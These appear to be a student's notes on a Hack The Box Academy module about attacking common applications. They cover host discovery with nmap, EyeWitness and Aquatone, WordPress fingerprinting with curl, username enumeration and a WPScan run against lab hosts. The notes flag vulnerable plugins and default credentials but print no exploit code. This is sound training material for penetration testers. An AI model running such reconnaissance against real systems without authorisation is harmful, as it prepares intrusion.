# HTB: Attacking Common Applications Module Summary

Module Link: https://academy.hackthebox.com/app/module/113

Applications connected to external services often contain poorly protected connection strings. Penetration testers can examine these application binaries to extract credentials, allowing them to move laterally, escalate privileges, or test for credential reuse across the network.

This module covers a variety of techniques needed to discover, footprint, enumerate, and attack various applications commonly encountered during internal and external penetration tests.

In this module, we will cover:

- Application Discovery & Enumeration
- Enumerating and attacking common CMS' such as WordPress, Drupal, and Joomla
- Enumerating and attacking Tomcat and Jenkins
- Enumerating and attacking infrastructure tools such as Splunk and PRTG Network Monitor
- Enumerating and attacking customer service management and configuration management tools such as osTicket and GitLab
- Other commonly seen applications
- Application hardening core concepts

# Setting the Stage

## **Introduction to Attacking Common Applications**

Web-based applications are prevalent in most if not all environments that we encounter as penetration testers. During our assessments, we will come across a wide variety of web applications such as Content Management Systems (CMS), custom web applications, intranet portals used by developers and sysadmins, code repositories, network monitoring tools, ticketing systems, wikis, knowledge bases, issue trackers, servlet container applications, and more. It's common to find the same applications across many different environments. While an application may not be vulnerable in one environment, it may be misconfigured or unpatched in the next. An assessor needs to have a firm grasp of enumerating and attacking the common applications covered in this module.

### **Application Data**

This module will study several common applications in-depth while briefly covering some other less common (but still seen often) ones. Just some of the categories of applications we may come across during a given assessment that we may be able to leverage to gain a foothold or gain access to sensitive data include:

| [Application Servers](https://enlyft.com/tech/application-servers) | Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc. |
| --- | --- |
| [Security Information and Event Management (SIEM)](https://enlyft.com/tech/security-information-and-event-management-siem) | Splunk, Trustwave, LogRhythm, etc. |
| [Network Management](https://enlyft.com/tech/network-management) | PRTG Network Monitor, ManageEngine Opmanger, etc. |
| [IT Management](https://enlyft.com/tech/it-management-software) | Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc. |
| [Software Frameworks](https://enlyft.com/tech/software-frameworks) | JBoss, Axis2, etc. |
| [Customer Service Management](https://enlyft.com/tech/customer-service-management) | osTicket, Zendesk, etc. |
| [Search Engines](https://enlyft.com/tech/search-engines) | Elasticsearch, Apache Solr, etc. |
| [Software Configuration Management](https://enlyft.com/tech/software-configuration-management) | Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc. |
| [Software Development Tools](https://enlyft.com/tech/software-development-tools) | Jenkins, Atlassian Confluence, phpMyAdmin, etc. |
| [Enterprise Application Integration](https://enlyft.com/tech/enterprise-application-integration) | Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc. |

As you can see browsing the links for each category above, there are [thousands of applications](https://enlyft.com/tech/)
 that we may encounter during a given assessment. Many of these suffer from publicly known exploits or have functionality that can be abused to gain remote code execution, steal credentials, or access sensitive information with or without valid credentials. This module will cover the most prevalent applications that we repeatedly see during internal and external assessments.

### Common Applications

I typically run into at least one of the applications below, which we will cover in-depth throughout the module sections. While we cannot cover every possible application that we may encounter, the skills taught in this module will prepare us to approach all applications with a critical eye and assess them for public vulnerabilities and misconfigurations.

| Application | Description |
| --- | --- |
| WordPress | [WordPress](https://wordpress.org/) is an open-source Content Management System (CMS) that can be used for 
multiple purposes. It's often used to host blogs and forums. WordPress is highly customizable as well as SEO friendly, which makes it popular among companies. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. 
WordPress is written in PHP and usually runs on Apache with MySQL as the backend. |
| Drupal | [Drupal](https://www.drupal.org/) is another open-source CMS that is popular among companies and developers. Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there's no DBMS installed. Like WordPress, Drupal allows users to enhance their 
websites through the use of themes and modules. |
| Joomla | [Joomla](https://www.joomla.org/) is yet another open-source CMS written in PHP that typically uses MySQL but can be made to run with PostgreSQL or SQLite. Joomla can be used for blogs, discussion forums, e-commerce, and more. Joomla can be customized heavily with themes and extensions and is estimated to be the third most used CMS on the internet after WordPress and Shopify. |
| Tomcat | [Apache Tomcat](https://tomcat.apache.org/) is an open-source web server that hosts applications written in Java. 
Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased with Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle. |
| Jenkins | [Jenkins](https://jenkins.io/) is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in 
Jenkins, including some that allow for remote code execution without requiring authentication. |
| Splunk | Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of 
information for an attacker if compromised. Historically, Splunk has not suffered from a considerable amount of known vulnerabilities aside from an information disclosure vulnerability ([CVE-2018-11409](https://nvd.nist.gov/vuln/detail/CVE-2018-11409)), and an authenticated remote code execution vulnerability in very old versions ([CVE-2011-4642](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4642)). |
| PRTG Network Monitor | [PRTG Network Monitor](https://www.paessler.com/prtg) is an agentless network monitoring system that can be used to monitor 
metrics such as uptime, bandwidth usage, and more from a variety of devices such as routers, switches, servers, etc. It utilizes an auto-discovery mode to scan a network and then leverages protocols such as ICMP, WMI, SNMP, and NetFlow to communicate with and gather data from
 discovered devices. PRTG is written in [Delphi](https://en.wikipedia.org/wiki/Delphi_(software)). |
| osTicket | [osTicket](https://osticket.com/)  is a widely-used open-source support ticketing system. It can be used to manage customer service tickets received via email, phone, and the web interface. osTicket is written in PHP and can run on Apache or IIS with MySQL as the backend. |
| GitLab | [GitLab](https://about.gitlab.com/) is an open-source software development platform with a Git repository manager, version control, issue tracking, code review, continuous integration and deployment, and more. It was originally written in Ruby but now utilizes Ruby on Rails, Go, and Vue.js. GitLab offers both 
community (free) and enterprises versions of the software. |

## **Application Discovery & Enumeration**

### 1. The Importance of Asset Inventory

- **Visibility is Security:** You cannot protect what you don't know exists. Organizations must track hardware, software, patch levels, and end-of-life status.
- **Identifying Risks:** Proper enumeration reveals "forgotten" software, expired trials that bypass authentication (e.g., Splunk), default credentials, and unpatched vulnerabilities.
- **Restricting Access:** Discovery helps identify administrative portals that should be restricted to specific IPs or `localhost`.

### 2. The Penetration Tester’s Workflow

When starting a "black box" assessment (with no prior info), testers follow a structured path to get the "lay of the land":

1. **Ping Sweep:** Identify live hosts.
2. **Port Scanning:** Use `nmap` to find open ports (e.g., 80, 443, 8080).
3. **Application Discovery:** Focus on web-based services.

### 3. Efficiency Tools: EyeWitness & Aquatone

Manually browsing hundreds of IP addresses is inefficient. Tools like **EyeWitness** and **Aquatone** automate this by:

- Importing raw XML data from scanners (Nmap, Masscan, Nessus).
- Automatically taking **screenshots** of every identified web application.
- Generating an HTML report to let the tester quickly visually "skim" the attack surface and prioritize interesting targets.

### 4. Professionalism through Organization

The text stresses that **notetaking** is as important as hacking. A structured notebook (using tools like Notion, OneNote, or CherryTree) should include:

- **Scope & Points of Contact:** Essential for legal and technical boundaries.
- **Scan Logs:** Exact syntax, dates, and timestamps (crucial for answering client questions about network activity).
- **Categorization:** Grouping data into "Discovery," "Exploitation," and "Post-Exploitation."

An example OneNote (also applicable to other tools) structure may look like the following for the discovery phase:

`External Penetration Test - <Client Name>`

- `Scope` (including in-scope IP addresses/ranges, URLs, any fragile hosts,
testing timeframes, and any limitations or other relative information we need handy)
- `Client Points of Contact`
- `Credentials`
- `Discovery/Enumeration`
    - `Scans`
    - `Live hosts`
- `Application Discovery`
    - `Scans`
    - `Interesting/Notable Hosts`
- `Exploitation`
    - `<Hostname or IP>`
    - `<Hostname or IP>`
- `Post-Exploitation`
    - `<Hostname or IP>`
    - `<Hostname or IP>`

### 5. Client Education

Beyond finding "holes," penetration testers provide value by educating clients on these same tools. This allows the organization to perform **proactive reconnaissance** and find gaps before an actual attacker does.

### Initial Enumeration

Let's assume our client provided us with the following scope:

```bash
$ cat scop_list.txt                   
app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
drupal-qa.inlanefreight.local
drupal-acc.inlanefreight.local
drupal.inlanefreight.local
blog.inlanefreight.local  
```

We can start with an Nmap scan of common web ports and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan. While reviewing the screenshot report of the most common ports, I may run a more thorough Nmap scan against the top 10,000 ports or all TCP ports, depending on the size of the scope. Since enumeration is an iterative process, we will run a web screenshotting tool against any subsequent Nmap scans we perform to ensure maximum coverage.

```bash
$ sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scop_list.txt  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-31 15:32 +03
Nmap scan report for app.inlanefreight.local (10.129.45.125)
Host is up (0.15s latency).
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for dev.inlanefreight.local (10.129.45.125)
Host is up (0.17s latency).
rDNS record for 10.129.45.125: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for drupal-dev.inlanefreight.local (10.129.45.125)
Host is up (0.15s latency).
rDNS record for 10.129.45.125: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for drupal-qa.inlanefreight.local (10.129.45.125)
Host is up (0.17s latency).
rDNS record for 10.129.45.125: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for drupal-acc.inlanefreight.local (10.129.45.125)
Host is up (0.16s latency).
rDNS record for 10.129.45.125: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for drupal.inlanefreight.local (10.129.45.125)
Host is up (0.19s latency).
rDNS record for 10.129.45.125: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for blog.inlanefreight.local (10.129.45.125)
Host is up (0.26s latency).
rDNS record for 10.129.45.125: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 7 IP addresses (7 hosts up) scanned in 3.32 seconds
                                                                                                 
```

Enumerating one of the hosts further using an Nmap service scan (`-sV`) against the default top 1,000 ports can tell us more about what is running on the webserver.

```bash
$ sudo nmap --open -sV 10.129.45.125                                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-31 15:35 +03
Nmap scan report for app.inlanefreight.local (10.129.45.125)
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.13 seconds
```

### Using EyeWitness

EyeWitness can take the XML output from both Nmap and Nessus and create a report with screenshots of each web application present on the various ports using Selenium. It will also take things a step further and categorize the applications where possible, fingerprint them, and suggest default credentials based on the application. It can also be given a list of IP addresses and URLs and be told to pre-pend `http://` and `https://` to the front of each. It will perform DNS resolution for IPs and can be given a specific set of ports to attempt to connect to and screenshot.

```bash
$ eyewitness --web -x web_discovery.xml -d inlanefright_eyewitness
```

The report will be saved as HTML

![Screenshot_2026-03-31_15_43_49.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/ca49c4b8-753d-4b57-8ca9-c4bdd5b6be6b.png)

![Screenshot_2026-03-31_15_44_08.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/94e21fe6-0a29-476b-9646-bcff73793340.png)

![Screenshot_2026-03-31_15_44_34.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/6bf943e0-e2a2-4a9e-8f90-9575c252a751.png)

![Screenshot_2026-03-31_15_44_52.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/ef4a34b7-a93e-4269-9e77-307a6cd8d173.png)

Note in the endpoint `drupal-acc.inlanefreight.local` and `drupal-qa.inlanefreight.local` It still has the default credentials applied “admin:admin”, the  same thing applies to other vhosts 

### Using Aquatone

[Aquatone](https://github.com/michenriksen/aquatone), as mentioned before, is similar to EyeWitness and can take screenshots when provided a `.txt` file of hosts or an Nmap `.xml` file with the `-nmap` flag.

```bash
 wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```

In this example, we provide the tool the same `web_discovery.xml` Nmap output specifying the `-nmap` flag

```bash
─$ cat web_discovery.xml | ./aquatone -nmap
aquatone v1.7.0 started at 2026-03-31T16:32:53+03:00

Targets    : 14
Threads    : 2
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://drupal-qa.inlanefreight.local/: 200 OK
...                                          
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2026-03-31T16:32:53+03:00
 - Finished at : 2026-03-31T16:33:03+03:00
 - Duration    : 10s

Requests:
 - Successful : 14
 - Failed     : 0

 - 2xx : 14
 - 3xx : 0
 - 4xx : 0
 - 5xx : 0

Screenshots:
 - Successful : 2
 - Failed     : 12

Wrote HTML report to: aquatone_report.html

```

the `aquatone_report.html` 

![Screenshot_2026-03-31_16_34_42.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/298b1a0a-d7f9-4763-a3ed-c736f7865ae3.png)

### Nessus

Nessus usually runs as a service on your machine (Port **8834**).

- **Linux:** `sudo systemctl start nessusd`
- **Web Access:** Open your browser and go to `https://localhost:8834`.

# Content Management Systems (CMS)

## WordPress - **Discovery & Enumeration**

WordPress  is an open-source Content Management System (CMS) that can be used for multiple purposes. It’s often used to host blogs and forums

### Discovery/Footprinting

A quick way to identify a WordPress site is by browsing to the `/robots.txt` file. A typical robots.txt on a WordPress installation may look like:

- Note: Before starting, update the target IP in your `/etc/hosts`
    
    ```bash
    10.129.34.117   app.inlanefreight.local dev.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local blog.inlanefreight.local
    
    ```
    

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```

Here the presence of the `/wp-admin` and `/wp-content` directories would be a dead giveaway that we are dealing with WordPress. Typically attempting to browse to the `wp-admin` directory will redirect us to the `wp-login.php` page. This is the login portal to the WordPress instance's back-end. http`://blog.inlanefreight.local/wp-login.php`

![WordPress login page with fields for username, password, and options to remember login or recover password.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/wp-login2.png)

WordPress stores its plugins in the `wp-content/plugins` directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the `wp-content/themes` directory. These files should be carefully enumerated as they may lead to RCE.

There are five types of users on a standard WordPress installation.

1. **Administrator**: This user has access to administrative features within the website.
This includes adding and deleting users and posts, as well as editing
source code.
2. **Editor**: An editor can publish and manage posts, including the posts of other users.
3. **Author**: They can publish and manage their own posts.
4. **Contributor**: These users can write and manage their own posts but cannot publish them.
5. **Subscriber**: These are standard users who can browse posts and edit their profiles.

Getting  access to an administrator is usually sufficient to obtain code execution on the server. Editors and authors might have access to certain vulnerable plugins, which normal users don’t.

### Enumeration

Another quick way to identify a WordPress site is by looking at the page source. 

```bash
$ curl -s http://blog.inlanefreight.local/  | grep "WordPress"
<meta name="generator" content="WordPress 5.8" />
```

enumerating the themes and plugins.

Looking at the page source, we can see that the [Business Gravity](https://wordpress.org/themes/business-gravity/) theme is in use. We can go further and attempt to fingerprint the theme version number and look for any known vulnerabilities that affect it.

```bash
$ curl -s http://blog.inlanefreight.local/  | grep "themes"
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='kfi-icons-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/kf-icons/css/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='owlcarousel-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/OwlCarousel2-2.2.1/assets/owl.carousel.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='owlcarousel-theme-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/OwlCarousel2-2.2.1/assets/owl.theme.default.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='business-gravity-blocks-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/css/blocks.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='business-gravity-style-css'  href='http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='transport-gravity-style-parent-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/style.css?ver=5.8' type='text/css' media='all' />
<link rel='stylesheet' id='transport-gravity-style-css'  href='http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css?ver=1.0.0' type='text/css' media='all' />
                   background-image: url(http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/images/placeholder/business-gravity-banner-1920-850.jpg );
                   background-image: url(http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/images/placeholder/business-gravity-banner-1920-850.jpg );
                        <img src="http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/images/placeholder/loader.gif" alt="Site Loader"></div>
        <img src="http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/images/placeholder/business-gravity-1170-710.png" >                      <a href="http://blog.inlanefreight.local/?p=1"></a>
        Copyright © All Rights Reserved. Business Gravity Theme by <a href="//keonthemes.com" target="_blank"> Keon Themes </a>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/js/bootstrap.min.js' id='bootstrap-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/js/skip-link-focus-fix.min.js' id='business-gravity-skip-link-focus-fix-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/js/navigation.js' id='business-gravity-navigation-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/OwlCarousel2-2.2.1/owl.carousel.min.js' id='owlcarousel-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/js/main.min.js' id='business-gravity-script-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/themes/transport-gravity/js/custom.js?ver=1.0.0' id='transport-gravity-script-js'></script>
```

From the output below, we know that the [Contact Form 7](https://wordpress.org/plugins/contact-form-7/) and [mail-masta](https://wordpress.org/plugins/mail-masta/) plugins are installed. The next step would be enumerating the versions.

```bash
$ curl -s http://blog.inlanefreight.local/  | grep "plugin"
<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
                <link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
```

Browsing to `http://blog.inlanefreight.local/wp-content/plugins/mail-masta/` shows us that directory listing is enabled and that a `readme.txt` file is present.

![Screenshot_2026-04-02_11_32_29.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/59661564-0339-410e-bdeb-f929031a11c5.png)

From the readme, it appears that version 1.0.0 of the plugin is installed, which suffers from a [Local File Inclusion](https://www.exploit-db.com/exploits/50226) vulnerability

```bash
=== Mail Masta ===

Contributors: mailmasta

Donate link: http://getmailmasta.com/

Tags: mail masta, autoresponder, automation, newsletters, campaigns, signup form, newsletter widget, marketing, email, notification, smtp, amazon ses

Requires at least: 3.0.1

Tested up to: 4.0.0

Stable tag: 1.0

License: GPLv2 or later

License URI: http://www.gnu.org/licenses/gpl-2.0.html
```

Let's dig around a bit more. Checking the page source of another page, we can see that the [wpDiscuz](https://wpdiscuz.com/) plugin is installed, and it appears to be version 7.0.4

```bash
$ curl -s "http://blog.inlanefreight.local/?p=1" | grep "plugins"
/wp-content/plugins/wpdiscuz/assets/css/wpdiscuz-combo.min.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/assets/js/wpdiscuz-combo.min.js?ver=7.0.4' id='wpdiscuz-combo-js-js'></script>

```

This plugin version is vulnerable to a [Remote Code Execution](https://www.exploit-db.com/exploits/49967)  that allows users to upload any type of files, including PHP files . Note that and move to the next step. It is important at this stage not to jump ahead of ourselves and start exploiting the first possible flaw we see, as there are many other potential vulnerabilities and misconfigurations possible in WordPress that we don't want to miss.

---

### Enumerating Users

At this stage, we will try to enumerate users and inspect the response, also checking for default credentials. `/wp-login.php`

Here I tried to login a valid username and an invalid password, which resulted in the following message:

![Screenshot_2026-04-02_11_55_40.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/f992940b-da55-4e34-add9-435862aadf5c.png)

However, invalid username result in this error message

```bash
	Error: The username test is not registered on this site. If you are unsure of your username, try your email address instead.
```

This makes WordPress vulnerable to username enumeration, which can be used to obtain a list of potential usernames.

Let's recap. At this stage, we have gathered the following data points:

- The site appears to be running WordPress core version 5.8
- The installed theme is Business Gravity
- The following plugins are in use: Contact Form 7, mail-masta, wpDiscuz
- The wpDiscuz version appears to be 7.0.4, which suffers from an unauthenticated remote code execution vulnerability
- The mail-masta version seems to be 1.0.0, which suffers from a Local File Inclusion vulnerability
- The WordPress site is vulnerable to user enumeration, and the user `admin` is confirmed to be a valid user

Let's take things a step further and validate/add to some of our data points with some automated enumeration scans of the WordPress site. Once we complete this, we should have enough information in hand to begin planning and mounting our attacks.

### WPScan

[WPScan](https://github.com/wpscanteam/wpscan) is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable.

WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. The free plan allows up to 25 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token parameter`

The `--enumerate` flag is used to enumerate various components of the WordPress application, such as:

```bash
    -e, --enumerate [OPTS]       Enumeration Process
                                  Available Choices:
                                   vp   Vulnerable plugins
                                   ap   All plugins
                                   p    Popular plugins
                                   vt   Vulnerable themes
                                   at   All themes
                                   t    Popular themes
                                   tt   Timthumbs
                                   cb   Config backups
                                   dbe  Db exports
```

Let’s invoke a normal enumeration scan against a WordPress website with the `--enumerate` flag and pass it an API token from WPVulnDB with the `--api-token` flag.

```bash
$ wpscan --url "http://blog.inlanefreight.local/" --enumerate --api-token <TOKEN>
 
 
[+] URL: http://blog.inlanefreight.local/ [10.129.34.117]
[+] Started: Thu Apr  2 12:26:46 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.8</generator>
 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.8</generator>

 | [!] 43 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     Fixed in: 5.8.1
 |     References:
 |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     Fixed in: 5.8.1
 |     References:
 |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811
 |      
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     Fixed in: 5.8.1
 |     References:
 |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199
 |     
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     Fixed in: 5.8.2
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |   
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |   
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |  
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |   
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |     
 | [!] Title: WordPress < 5.9.2 / Gutenberg < 12.7.2 - Prototype Pollution via Gutenberg’s wordpress/url package
 |     Fixed in: 5.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/6e61b246-5af1-4a4f-9ca8-a8c87eb2e499
 |    
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.8.5
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |    
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 5.8.5
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 5.8.5
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |     
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |     
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 5.8.6
